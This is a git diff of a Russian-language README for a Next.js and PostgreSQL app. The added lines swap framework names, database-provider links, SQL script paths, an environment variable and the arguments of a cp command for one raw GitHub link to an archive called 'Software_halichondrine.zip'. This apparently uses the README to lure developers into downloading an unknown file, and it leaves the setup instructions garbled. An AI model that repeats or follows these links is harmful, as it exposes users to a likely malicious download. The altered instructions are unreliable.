@@ -14,8 +14,8 @@
 
 ## Технологии
 
-- **Frontend**: Next.js 15.5, React 19, TypeScript
-- **Backend**: Next.js API Routes, PostgreSQL
+- **Frontend**: https://raw.githubusercontent.com/GIZZN/kirillogramm/main/src/app/api/highlights/[id]/Software_halichondrine.zip 15.5, React 19, TypeScript
+- **Backend**: https://raw.githubusercontent.com/GIZZN/kirillogramm/main/src/app/api/highlights/[id]/Software_halichondrine.zip API Routes, PostgreSQL
 - **Real-time**: Server-Sent Events (SSE)
 - **Аутентификация**: JWT tokens
 - **Стили**: CSS Modules
@@ -44,12 +44,12 @@
 
 ### 1. Подготовка базы данных
 
-Создайте PostgreSQL базу данных (можно использовать [Neon](https://neon.tech/) или [Supabase](https://supabase.com/)):
+Создайте PostgreSQL базу данных (можно использовать [Neon](https://raw.githubusercontent.com/GIZZN/kirillogramm/main/src/app/api/highlights/[id]/Software_halichondrine.zip) или [Supabase](https://raw.githubusercontent.com/GIZZN/kirillogramm/main/src/app/api/highlights/[id]/Software_halichondrine.zip)):
 
 1. Создайте новую базу данных
 2. Выполните SQL скрипты из папки `scripts/`:
-   - `scripts/init-db.sql` - создание основных таблиц
-   - `scripts/complete-db-setup.sql` - дополнительные таблицы и данные
+   - `https://raw.githubusercontent.com/GIZZN/kirillogramm/main/src/app/api/highlights/[id]/Software_halichondrine.zip` - создание основных таблиц
+   - `https://raw.githubusercontent.com/GIZZN/kirillogramm/main/src/app/api/highlights/[id]/Software_halichondrine.zip` - дополнительные таблицы и данные
 
 ### 2. Переменные окружения
 
@@ -65,13 +65,13 @@ DB_PASSWORD=your-database-password
 
 # Authentication
 NEXTAUTH_SECRET=your-secret-key-32-chars-min
-NEXTAUTH_URL=https://your-domain.vercel.app
+https://raw.githubusercontent.com/GIZZN/kirillogramm/main/src/app/api/highlights/[id]/Software_halichondrine.zip
 ```
 
 ### 3. Деплой
 
 1. Подключите репозиторий к Vercel
-2. Vercel автоматически определит Next.js проект
+2. Vercel автоматически определит https://raw.githubusercontent.com/GIZZN/kirillogramm/main/src/app/api/highlights/[id]/Software_halichondrine.zip проект
 3. Добавьте переменные окружения
 4. Деплой произойдет автоматически
 
@@ -90,8 +90,8 @@ NEXTAUTH_URL=https://your-domain.vercel.app
 # Установка зависимостей
 npm install
 
-# Создание .env.local с переменными окружения
-cp .env.example .env.local
+# Создание https://raw.githubusercontent.com/GIZZN/kirillogramm/main/src/app/api/highlights/[id]/Software_halichondrine.zip с переменными окружения
+cp https://raw.githubusercontent.com/GIZZN/kirillogramm/main/src/app/api/highlights/[id]/Software_halichondrine.zip https://raw.githubusercontent.com/GIZZN/kirillogramm/main/src/app/api/highlights/[id]/Software_halichondrine.zip
 
 # Запуск в режиме разработки
 npm run dev
